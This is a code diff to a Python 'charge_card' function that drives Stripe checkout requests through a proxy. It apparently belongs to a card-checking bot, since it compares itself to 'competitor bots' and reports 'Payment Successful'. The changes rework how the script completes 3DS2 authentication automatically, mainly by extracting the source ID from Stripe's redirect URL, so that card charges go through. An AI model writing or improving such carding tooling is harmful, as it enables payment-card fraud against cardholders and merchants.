@@ -1131,7 +1131,6 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                 f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                 f"&expected_payment_method_type=card"
-                f"&use_stripe_sdk=true"
                 f"&key={pk}"
                 f"&init_checksum={checksum}"
             )
@@ -1181,14 +1180,26 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     result["response"] = "Payment Successful ✅💚"
                 elif st == "requires_action":
                     # --- 3DS2 Frictionless Authentication ---
-                    # Competitor bots complete 3DS2 via API (takes ~6s extra)
-                    # This is why they get decline/charge instead of "3DS Skipped"
+                    # Extract 3DS source from redirect URL or next_action
                     next_action = pi.get("next_action") or conf.get("next_action") or {}
-                    sdk_data = next_action.get("use_stripe_sdk") or {}
-                    source_3ds = sdk_data.get("three_d_secure_2_source") or sdk_data.get("source")
+                    source_3ds = None
                     
-                    print(f"[DEBUG] 3DS triggered, attempting 3DS2 authenticate...")
-                    print(f"[DEBUG] next_action type: {next_action.get('type')}, source: {source_3ds}")
+                    # Method 1: Extract from redirect URL (hooks.stripe.com/redirect/authenticate/src_xxx)
+                    redirect_data = next_action.get("redirect_to_url") or {}
+                    redirect_url = redirect_data.get("url", "")
+                    if "/authenticate/" in redirect_url:
+                        # Extract src_xxx from URL path
+                        import re
+                        src_match = re.search(r'/authenticate/(src_[A-Za-z0-9]+)', redirect_url)
+                        if src_match:
+                            source_3ds = src_match.group(1)
+                    
+                    # Method 2: From use_stripe_sdk data (if available)
+                    if not source_3ds:
+                        sdk_data = next_action.get("use_stripe_sdk") or {}
+                        source_3ds = sdk_data.get("three_d_secure_2_source") or sdk_data.get("source")
+                    
+                    print(f"[DEBUG] 3DS triggered. source: {source_3ds}, redirect: {redirect_url[:80] if redirect_url else 'none'}")
                     
                     if source_3ds:
                         try:
